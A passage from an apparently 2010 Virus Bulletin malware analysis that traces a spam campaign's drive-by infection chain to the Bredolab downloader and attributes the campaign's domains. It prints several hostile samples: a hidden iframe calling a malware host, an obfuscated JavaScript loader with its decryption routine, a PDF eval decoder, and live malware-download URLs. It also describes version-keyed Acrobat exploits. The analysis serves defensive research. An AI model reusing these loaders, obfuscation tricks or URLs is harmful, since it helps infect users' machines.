&lt;iframe src=&rsquo;http://cache.lamcfoundation.org:8080/index.php?pid=10&rsquo; width=&rsquo;1&rsquo; height=&rsquo;1&rsquo; 
style=&rsquo;visibility: hidden;&rsquo;&gt;&lt;/iframe&gt;</pre><p>At this point the spam and malware distribution forked, pointing to totally different sites. I should note that we have not observed a single overlap between the two types of sites.</p><p>Special care had to be taken when fetching the malware content with static analysis tools like wget &ndash; the distribution site returned malcode only if the referrer of the query was the spam landing site; otherwise a zero length file was received. Similar behaviour has already been reported for the Gumblar architecture.</p></div><div class="sect2" lang="en"><div class="titlepage"><div><div><h3 class="title"><a class="chapter" id="id4125022"></a>Stage 3: attack selector</h3></div></div></div><p>The returned malcode is a moderately obfuscated encrypted JavaScript, with some additional spice to it.</p><p>The string constants were garbled with the same replace trick as described earlier &ndash; with the same limitation (exactly one garbage character inserted after each character). Junk (string) variable assignments were inserted into the code, with the interesting characteristics that eventually the same assignment did appear several times in the code.</p><p>The scheme of the code is as follows:</p><pre class="programlisting">&lt;html&gt;&lt;head&gt;&lt;title&gt;Dkxl5pxegj6fr6rcu5&lt;/title&gt;&lt;/head&gt;&lt;body&gt;
&lt;div style=&rdquo;visibility: hidden;&rdquo;&gt;&lt;div name=&rdquo;part1&rdquo; id=&rdquo;part1&rdquo;&gt;7T99T114T107T96T113T102...
T37T35T64T&lt;/div&gt;
...
&lt;div name=&rdquo;part5&rdquo; id=&rdquo;part5&rdquo;&gt;6T57T91T44T32T35T35T38T33T102...T118T37T38T56T7&lt;/div&gt;
<span class="bold"><strong>&lt;script type=&rdquo;text/javascript&rdquo; language=&rdquo;javascript&rdquo;&gt;
document.write(&lsquo;&lt;script src=jquery.jxx?build=2.1.7&gt;&lt;/script&gt;&rsquo;);&lt;/script&gt;</strong></span>
&lt;script&gt;
var encoded_string = &ldquo;&rdquo;;
encoded_string +=document.getElementById(&ldquo;part1&rdquo;).innerHTML;
...
encoded_string +=document.getElementById(&ldquo;part5&rdquo;).innerHTML;
<span class="bold"><strong>if ( typeof(separator_char) == &ldquo;undefined&rdquo;) separator_char = &ldquo;Cpwj9is0h&rdquo;;</strong></span>
function decrypt(encoded_string) {
  char_array = encoded_string.split(separator_char);
  var local_decoded = &ldquo;&rdquo;;
  for (var i=0;i&lt;char_array.length-1;i++) {
    nextchar = parseInt(char_array[i]);
    nextchar += 3;
    local_decoded += String.fromCharCode(nextchar);
  }
  return(local_decoded);
}
document.write(&lsquo;&lt;script&gt;&rsquo;);
document.write(decrypt(encoded_string););
document.write(&lsquo;&lt;/script&gt;&rsquo;);
&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;</pre><p>At first sight the encrypted content is clearly a hex string, with each character separated by a &lsquo;T&rsquo; separator, and it is stored in div tags in the HTML body, later referenced by getElementById. Then the encryption is an extremely simple increment by 3 (which changed in subsequent versions to 4 or 2).</p><p>The interesting part is the highlighted section of the code, which assigns the value &lsquo;Cpwj9is0h&rsquo; to the separator character &ndash; not the same as the intuitively guessed &lsquo;T&rsquo; &ndash; which is clearly nonsense. The solution is in the bolded part of the code, which is a separate script reference to jquery.jxx (commonly reported in connection with Gumblar architecture). The code fetched from this query is trivially:</p><pre class="programlisting">eval(&ldquo;separator_char =&rsquo;T&rsquo;;&rdquo;);</pre><p>Thus, if the script undergoes blind static analysis, or a dynamic analysis is performed offline, the result will be an empty string. Only if the correct separator is fetched (or guessed) can the script be decrypted.</p><p>Needless to say, the decrypted code itself is obfuscated, but only slightly (one can always observe in malware analysis that as we go deeper, the protection becomes less complicated). Only the string constants are garbled with the very same replace construct that is used throughout this malware family.</p><p>After stripping down to the basics, the first part of this script downloads the binary malware file from the URL &lsquo;http://lib.willyselectronics.com:8080/welcome.php?id=0pid=1&rsquo; using the traditional XMLHTTP+ADODBStream method used by the Psyme downloaders.</p><p>The second part of the code downloads to an iframe an HTML page and a PDF file:</p><pre class="programlisting">function download_pdf_html(){
     pdf_array = new Array(&ldquo;AcroPDF.PDF&rdquo;, &ldquo;PDF.PdfCtrl&rdquo;);
     iframe_open = &lsquo;&lt;iframe&rsquo;);    iframe_close = &lsquo;&lt;/iframe&gt;&rsquo;);
  for(i in pdf_array)
  {try {
     Shkbje = new ActiveXObject(pdf_array[i]);
     if (Shkbje)
     {
     document.write(iframe_open+&rsquo; src=&rdquo;Notes1.pdf&rdquo;&gt;&rsquo;+iframe_close);}
     }
     catch(e){}
  }
  try {if (navigator.javaEnabled()){
     document.write(iframe_open+&rsquo; src=&rdquo;Applet1.html&rdquo;&gt;&rsquo;+iframe_close);}
  }
  catch(e){}
}</pre><p>The name of the components changed (observed names included Notes10.pdf, Notes6.pdf, Applet10.html and Applet6.html). Interestingly, the Applet*.html download worked in most of the observed cases, but the sites failed to serve Notes*.pdf in most cases.</p><p>The downloaded executable is the usual Bredolab downloader. The cascade of events after executing it is already reasonably well documented [<span class="citation"><a href="#citation.2">2</a></span>], so we will focus on the script parts.</p></div><div class="sect2" lang="en"><div class="titlepage"><div><div><h3 class="title"><a class="chapter" id="id3668212"></a>Stage 4a: PDF</h3></div></div></div><p>The PDF file contains about four FlateDecode streams (although it could be fewer or more). All but one store binary data in ASCII hex representation, and a fifth is a decoder, obfuscated with the methods characteristic of the family, with some additional junk constructs:</p><pre class="programlisting">xK=[&ldquo;qP&rdquo;,&rdquo;zI&rdquo;];
var vW={aD:false};
this.yZ=3491;this.yZ--;
try {var rM=&rsquo;qHE&rsquo;} catch(rM){};
var fO={cRU:&rdquo;mP&rdquo;.charCodeAt(9152)};
try {var tKX=&rsquo;eTC&rsquo;.substring(7397)} catch(tKX){};
mBY=24528;mBY+=247;
xU=function(qZU,fAV,eX,cZ){return qZU-fAV};
</pre><p>Furthermore, in order to reduce readability, the internal functions (also the external) in the code are used via wrapper calls that are extended to have four parameters, although they use only one or two of them.</p><p>The stripped-down decoder has the following schematic form:</p><pre class="programlisting">var decoded_body=&rdquo;&rdquo;;
for(i=0;i&lt;this[&lsquo;getPageNumWords&rsquo;](2);i++){
     var nextbyte=this[&lsquo;getPageNthWord&rsquo;](2,i);
     nextbyte=String[&ldquo;fromCharCode&rdquo;](parseInt(substr(nextbyte,0,2),2)^180);
     decoded_body=decoded_body+decode_byte(substr(nextbyte,0,2));
     };
eval(decoded_body);</pre><p>This decoder grabs the encoded bytes from the PDF file, applies the xor transformation with a static key (180), then executes it using eval().</p><p>Of the four FlateDecode streams, three are decoys, containing only garbage, and only one is meaningful code. (In other instances of the same threat the number of junk streams differed.)</p><p>The reason for the existence of this PDF file lies in the FlateDecode stream of about 3,000 bytes. It is almost &lsquo;naked&rsquo; &ndash; not many obfuscation code fragments were used, but there are some complicated constructs, which are hardly distinguishable from the valuable instructions:</p><pre class="programlisting">this.d=31777;this.d++
x={t:&rdquo;j&rdquo;};
var eB={};
try {var oL=&rsquo;wR&rsquo;.substr(12679,12679)} catch(oL){};</pre><p>Notably, this is the first component where the valuable code outnumbers the junk instructions.</p><p>The code employs a handful of exploits depending on the <em class="productname">Acrobat</em> PDF reader version. As the conditions overlap, there may be versions where multiple exploits are launched.</p><p>If the version is above 8, util.printf will be used. If the version is below 8, the Collab.collectEmailInfo exploit is constructed. For versions below 9.1 the Collab.getIcon exploit is employed. Finally, for version 9.1 a media.newPlayer exploit is launched. The exploit codes themselves are pretty much the standard codes used for the particular vulnerability, as expected.</p><p>The shellcode itself is stored in the code in UCS2 form, a commonly reused URLDownloadToFile-&gt;WinExec code, having been observed in completely unrelated PDF-based attacks in the past. The URL itself is not stored inside this code, but outside in the PDF file, in the Keywords field. It is encoded using a simple replacement cipher, with the keytable being stored in the Author field.</p><p>In some of the samples the URL was also stored in the Title or Author files, and the keytable in the eD field, but that can be overcome without even having to analyse the code thanks to the peculiarities of the fields (the keytable contains all alphanumeric characters and only once; the URL contains the recurring &lsquo;t&rsquo; and &lsquo;:&rsquo; characters in the beginning &ndash; both are easily spottable).</p><p>Both fields are scattered with spaces to make them look less suspicious. This approach makes it possible to quickly change the URL without having to recompile the entire PDF file. Ironically, in the observed cases quite the opposite happened: the PDF was recompiled (with the shellcode-creating script recompiled using new junk instructions), and the URL itself remained essentially unchanged. The URL observed in the majority of PDFs was http://lib.willyselectronics.com:8080/welcome.php?id=6&amp;pid=1&amp;masha=590227589 with the value of masha being changed across the samples. Additionally, the PDF reader is also appended to the end in the form &amp;? reader_version=%version%.</p><p>Uncharacteristically, the code contains debug messages if the Producer field of the PDF file begins with the text &lsquo;debug&rsquo;. Then, the major operational acts of the code and values of constants like the decoded URL are logged using app.alert.</p></div><div class="sect2" lang="en"><div class="titlepage"><div><div><h3 class="title"><a class="chapter" id="id2924603"></a>Stage 4b: HTML</h3></div></div></div><p>The twin part of the PDF attack is a piece of HTML employing the CVE-2010-0886 exploit in very much the same (not even obfuscated) form as the original proof-of-concept code. It contains the URL in base64-encoded hex representations. In most cases this URL was http://lib.willyselectronics.com:8080/welcome.php?id=11&amp;pid=10&amp;1=1, but there were occurrences where the URL pointed back to the intermediate malware-serving site, in the same form: http://gogoop.casanovarevealed.com:8080/welcome.php?id=11&amp;pid=1&amp;1=1&amp;5d.</p></div></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id3352690"></a>Where do you want to go today?</h2></div></div></div><p>The final spam and Bredolab landing sites all had relatively long lifespans in the attack (ranging from days to weeks), and the intermediate sites didn&rsquo;t last longer than a day.</p><div class="figure"><a id="figure.3"></a><div class="mediaobject"><img alt="Spam dropsites." src="/uploads/images/figures/2010/10/Szapi-T1.jpg" /></div><p class="title"><b>Figure&nbsp;3.&nbsp;Spam dropsites.</b></p></div><p>On checking the registration information for the utilized domains it all started to become clear. Following the old rule (&lsquo;cui prodest?&rsquo;), the gain of this attack was the distribution of the spam landing site. As this site points to web pages registered in China, registered by Chinese email addresses (except for one notable exception), we can conclude that the attack must originate from China. Case closed.</p><p>However, there are more elements to this picture. Looking at the intermediate and final malware distribution sites, a totally different picture can be observed.</p><div class="figure"><a id="figure.4"></a><div class="mediaobject"><img alt="Intermediate malware dropsites." src="/uploads/images/figures/2010/10/Szapi-T2.jpg" /></div><p class="title"><b>Figure&nbsp;4.&nbsp;Intermediate malware dropsites.</b></p></div><div class="figure"><a id="figure.5"></a><div class="mediaobject"><img alt="Final Bredolab landing sites." src="/uploads/images/figures/2010/10/Szapi-T3.jpg" /></div><p class="title"><b>Figure&nbsp;5.&nbsp;Final Bredolab landing sites.</b></p></div><p>Most of the identified sites are subdomains of a domain registered via godaddy.com &ndash; these sites were probably compromised. Meanwhile, another group of sites were registered in Russia only a few days prior to their use in the attack. The email addresses used for registration appeared only to have been used for this purpose &ndash; no legitimate traffic was found relating to these addresses. One of the registrars of this domain, NAUNET-REG-RIPN, is a well-known spam- and malware-friendly provider &ndash; the preferred home for Russian cybercriminals [<span class="citation"><a href="#citation.4">4</a></span>]. DNRegistrar.ru is also frequently reported in connection with spam and malware.</p><p>A couple of these sites were registered in the same way as the intermediate distribution sites, but it is interesting to note that the majority seem to be using hacked legitimate websites, most of which are from godaddy.com, which has been the target in numerous cases of stolen accounts.</p><p>To summarize, the spam landing sites were registered in China only for use in the campaign; the intermediate sites are short-lived (often fast-flux) domains registered in Russia; and the final Bredolab landing sites are pretty much the same, except that these sites have a somewhat longer lifespan.</p><p>It is interesting to see a totally different approach to the different layers of the distribution. It does not make much sense to overcomplicate it so my only guess is that the different layers were outsourced/rented: the spam landing site was borrowed from a spam distribution group, and the group behind this attack was only responsible for the seeded email messages, the intermediate layers and the final Bredolab landing page. It may be a far-fetched conclusion, but it fits in the domain usage scheme. What also somewhat supports this hypothesis is the fact that the spam messages were written in good English, while the comments in the malware code were not.</p><p>The timeline of the intermediate distribution of the sites is rather interesting. In outline, the attack used hacked godaddy.com sites in the beginning and then switched to Russian sites (registered in a hurry, a couple of days beforehand) &ndash; a strange change of approach right in the middle of the events. Even more interesting is the story of the first couple of days, where Russian sites were used, along with a distribution method that has not been seen since. Moreover, the spam landing site was the one used a couple of transitions later and not in the beginning. Peculiar.</p><div class="bibliography"><div class="titlepage"><div><div><h3 class="title"><a class="chapter" id="id3590925"></a>Bibliography</h3></div></div></div><div class="bibliomixed"><a id="citation.1"></a><p class="bibliomixed">[1] Danchev, D. Spamvertised Amazon &lsquo;Verify Your Email&rsquo;, &lsquo;Your Amazon Order&rsquo; Malicious Emails. Dancho Danchev&rsquo;s Blog &ndash; Mind Streams of Information Security Knowledge. <span class="bibliosource"><a href="https://ddanchev.blogspot.com/2010/07/spamvertised-amazon-verify-you-email.html" target="_blank">http://ddanchev.blogspot.com/2010/07/spamvertised-amazon-verify-you-email.html</a></span>.</p></div><div class="bibliomixed"><a id="citation.2"></a><p class="bibliomixed">[2] The Cash Factory. Securelist. <span class="bibliosource"><a href="https://www.securelist.com/en/analysis/204792083/The_Cash_Factory" target="_blank">http://www.securelist.com/en/analysis/204792083/The_Cash_Factory</a></span>.</p></div><div class="bibliomixed"><a id="citation.3"></a><p class="bibliomixed">[3] Kadiev, A. Web server-based malware - the Pegel case. Security Analyst Summit 2010.</p></div><div class="bibliomixed"><a id="citation.4"></a><p class="bibliomixed">[4] cashweed.ru. McAfee SiteAdvisor. <span class="bibliosource"><a href="https://www.siteadvisor.com/sites/cashweed.ru" target="_blank">http://www.siteadvisor.com/sites/cashweed.ru</a></span>.</p></div></div></div> </div>
<div class="col-md-3 col-sm-3 col-lg-3">
<div id="NDPHPBlock13359" class="NDPHPBlock">
<div style="width: 100%;"><div style='float: left; width: 20%; margin-left: auto; margin-right: auto; text-align: center;'><center><a target='_blank' title='Tweet this!' href="https://twitter.com/share?text=It's just spam, it can't hurt, right?&url=https://www.virusbulletin.com/virusbulletin/2010/10/it-s-just-spam-it-can-t-hurt-right"><img src='/uploads/images/buttons/twitter.png' alt='twitter.png' width='45' height='45' class='responsive' /></a></center></div><div style='float: left; width: 20%; margin-left: auto; margin-right: auto; text-align: center;'><center><a target='_blank' title='Share on Facebook' href='https://www.facebook.com/sharer.php?u=https://www.virusbulletin.com/virusbulletin/2010/10/it-s-just-spam-it-can-t-hurt-right'><img src='/uploads/images/buttons/fb.png' alt='fb.png' width='45' height='45' class='responsive' /></a></center></div><div style='float: left; width: 20%; margin-left: auto; margin-right: auto; text-align: center;'><center><a target='_blank' title='Share on LinkedIn' href="https://www.linkedin.com/shareArticle?mini=true&url=https://www.virusbulletin.com/virusbulletin/2010/10/it-s-just-spam-it-can-t-hurt-right&title=It's just spam, it can't hurt, right?"><img src='/uploads/images/buttons/linkedin.png' alt='linkedin.png' width='45' height='45' class='responsive' /></a></center></div><div style='float: left; width: 20%; margin-left: auto; margin-right: auto; text-align: center;'><center><a target='_blank' title='Share on Hacker News' href="https://news.ycombinator.com/submitlink?u=https://www.virusbulletin.com/virusbulletin/2010/10/it-s-just-spam-it-can-t-hurt-right&t=It's just spam, it can't hurt, right?"><img src='/uploads/images/buttons/hackernews.png' alt='hackernews.png' width='45' height='45' class='responsive' /></a></center></div><div style='float: left; width: 20%; margin-left: auto; margin-right: auto; text-align: center;'><center><a target='_blank' title='reddit this!' href="https://www.reddit.com/submit?url=https://www.virusbulletin.com/virusbulletin/2010/10/it-s-just-spam-it-can-t-hurt-right"><img src='/uploads/images/buttons/reddit.png' alt='reddit.png' width='45' height='45' class='responsive' /></a></center></div></div></div><p>Â </p>
<h2>Latest articles:</h2>
<div class="ccm-page-list">
<h3 class="ccm-page-list-title">
<a href="/virusbulletin/2022/04/cryptojacking-fly-teamtnt-using-nvidia-drivers-mine-cryptocurrency/" target="_self">Cryptojacking on the fly: TeamTNT using NVIDIA drivers to mine cryptocurrency</a>
</h3>
<div class="ccm-page-list-description">
TeamTNT is known for attacking insecure and vulnerable Kubernetes deployments in order to infiltrate organizations&rsquo; dedicated environments and transform them into attack launchpads. In this article Aditya Sood presents a new module introduced by&hellip; </div>
<h3 class="ccm-page-list-title">
<a href="/virusbulletin/2021/12/collector-stealer-russian-origin-credential-and-information-extractor/" target="_self">Collector-stealer: a Russian origin credential and information extractor</a>
</h3>
<div class="ccm-page-list-description">
Collector-stealer, a piece of malware of Russian origin, is heavily used on the Internet to exfiltrate sensitive data from end-user systems and store it in its C&amp;C panels. In this article, researchers Aditya K Sood and Rohit Chaturvedi present a 360&hellip; </div>
<h3 class="ccm-page-list-title">
<a href="/virusbulletin/2021/06/fighting-fire-fire/" target="_self">Fighting Fire with Fire</a>
</h3>
<div class="ccm-page-list-description">
In 1989, Joe Wells encountered his first virus: Jerusalem. He disassembled the virus, and from that moment onward, was intrigued by the properties of these small pieces of self-replicating code. Joe Wells was an expert on computer viruses, was partly&hellip; </div>
<h3 class="ccm-page-list-title">
<a href="/virusbulletin/2021/04/run-your-malicious-vba-macros-anywhere/" target="_self">Run your malicious VBA macros anywhere!</a>
</h3>
<div class="ccm-page-list-description">
Kurt Natvig wanted to understand whether it&rsquo;s possible to recompile VBA macros to another language, which could then easily be &lsquo;run&rsquo; on any gateway, thus revealing a sample&rsquo;s true nature in a safe manner. In this article he explains how he recompiled&hellip; </div>
<h3 class="ccm-page-list-title">
<a href="/virusbulletin/2021/04/dissecting-design-and-vulnerabilities-azorultccpanels/" target="_self">Dissecting the design and vulnerabilities in AZORult&nbsp;C&amp;C&nbsp;panels</a>
</h3>
<div class="ccm-page-list-description">
Aditya K Sood looks at the command-and-control (C&amp;C) design of the AZORult malware, discussing his team's findings related to the C&amp;C design and some security issues they identified during the research. </div>
</div>
<p><br /><a class="btn btn-block btn-warning" href="/virusbulletin/archive">Bulletin Archive</a></p> </div>
</div>
</div>

<footer class="bs-footer" role="contentinfo">
<div class="container">
<div class="bs-social">
<div class="row ">
<div class="col-md-3">
<p><a title="About Us" href="/about-vb/about-us/">About us</a></p>
<p><a title="Contact Us" href="/about-vb/contact-us/">Contact us</a></p>
<p><a title="Advisory Board" href="/about-vb/advisory-board/">Advisory board</a></p>
<p><a title="Press" href="/about-vb/press/">Press information</a></p>
<p><a title="Security Events Calendar" href="/resources/calendar/">Security events calendar</a></p>
<p><a title="Newsletter" href="/newsletter/">Virus Bulletin newsletter</a></p> </div>
<div class="col-md-3">
<p><a title="VB Testing" href="/testing/">Testing</a></p>
<p><a title="VB100" href="/testing/vb1001/">VB100</a></p>
<p><a title="VBSpam" href="/testing/vbspam/">VBSpam</a></p>
<p><a title="VBWeb" href="/testing/vbweb/">VBWeb</a></p>
<p><a title="Consultancy Services" href="/testing/consultancy-services/">Consultancy services</a></p>
<p><a title="The Spammers' Compendium" href="/resources/spammerscompendium/">Spammers' Compendium</a></p> </div>
<div class="col-md-3">
<p><a title="VB2021 localhost" href="/conference/vb2021/">VB2021 localhost</a></p>
<p><a title="VB2020 localhost" href="/conference/vb2020/">VB2020 localhost</a></p>
<p><a title="VB2019" href="/conference/vb2019/">VB2019 (London)</a></p>
<p><a title="VB2018" href="/conference/vb2018">VB2018 (Montreal)</a></p>
<p><a title="VB2017" href="/conference/vb2017">VB2017 (Madrid)</a></p>
<p><a title="Conference Archive" href="/conference/vb-conference-archive/">Older conferences</a></p> </div>
<div class="col-md-3">
<div class="row">
<table style="float: right;" border="0">
<tbody>
<tr>
<td align="center"><a href="/rss" target="_blank"><img title="Get our blog updates" src="/uploads/images/buttons/rss-square-gray.png" alt="rss.png" width="35" height="35" /></a></td>
<td>Â </td>
<td align="center"><a href="https://twitter.com/virusbtn" target="_blank"><img class="bhtmbxoyxwpzahwcvxnw" title="Visit us on Twitter" src="/uploads/images/buttons/twitter-square-gray.png" alt="twitter.png" width="35" height="35" /></a></td>
<td>Â </td>
<td align="center"><a href="https://www.linkedin.com/company/virus-bulletin" target="_blank"><img class="bhtmbxoyxwpzahwcvxnw" title="Visit us on LinkedIn" src="/uploads/images/buttons/linkedin-square-gray.png" alt="linkedin.png" width="35" height="35" /></a></td>
<td>Â </td>
<td align="center"><a href="https://www.facebook.com/virusbulletin" target="_blank"><img title="Visit us on Facebook" src="/uploads/images/buttons/fb-square-gray.png" alt="twitter.png" width="35" height="35" /></a></td>
<td>Â </td>
<td align="center"><a href="https://www.youtube.com/user/virusbtn" target="_blank"><img title="Visit us on Youtube" src="/uploads/images/buttons/youtube-square-gray.png" alt="youtube.png" width="35" height="35" /></a></td>
</tr>
</tbody>
</table>
</div> </div>
</div>
<div class="row ">
<div class="col-md-12">
</div>
</div>
</div>
</div>
</footer>

<footer class="bs-footer2" role="contentinfo">
<div class="container">
<div class="bs-social2">
<div class="row ">
<div class="col-md-3">
</div>
<div class="col-md-3">
</div>
<div class="col-md-3">
</div>
<div class="col-md-3">
</div>
</div>
<div class="row ">
<div class="col-md-12">
<p style="text-align: left;">Â©1989-2022 Virus Bulletin.Â Â Â Â Â Â Â Â <a title="Privacy Policy" href="/about-vb/privacy-policy/">Privacy policy</a>Â Â Â Â Â Â Â Â <a title="Cookies" href="/about-vb/privacy-policy/cookies/">Cookies</a>Â Â Â Â Â Â Â Â <a title="Terms and Conditions" href="/about-vb/terms-and-conditions/">Terms and Conditions</a></p> </div>
</div>
</div>
</div>
</footer>

<script async src="https://www.googletagmanager.com/gtag/js?id=UA-21876594-2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-21876594-2', { 'anonymize_ip': true });
</script><script type="text/javascript" src="/libraries/js/fancybox.load.js"></script>
<script type="text/javascript" src="/packages/bootstrap/js/common/app.js"></script>
<div id="ccm-cookiesDisclosure" class="disclosure-bottom">
<div class="disclosure-container">
<div class="disclosure-content">
<p> We have placed cookies on your device in order to improve the functionality of this site, as outlined in our <a href="/about-vb/privacy-policy/cookies" target="_blank">cookies policy</a>. However, you may delete and block all cookies from this site and your use of the site will be unaffected. By continuing to browse this site, you are agreeing to Virus Bulletin's use of data as outlined in our <a href="/about-vb/privacy-policy/" target="_blank">privacy policy</a>.</p>
</div>
<div class="disclosure-form">
<form action="/index.php/cookies_disclosure/" method="POST">
<input type="hidden" name="allowCookies" value="1" />
<div class="button">
<input class="btn btn-info btn-sm" type="submit" name="submit" value="I understand. Don't show this message again!" />
</div>
</form>
</div>
<div class="ccm-spacer">&nbsp;</div>
</div>
</div>
</body>
</html>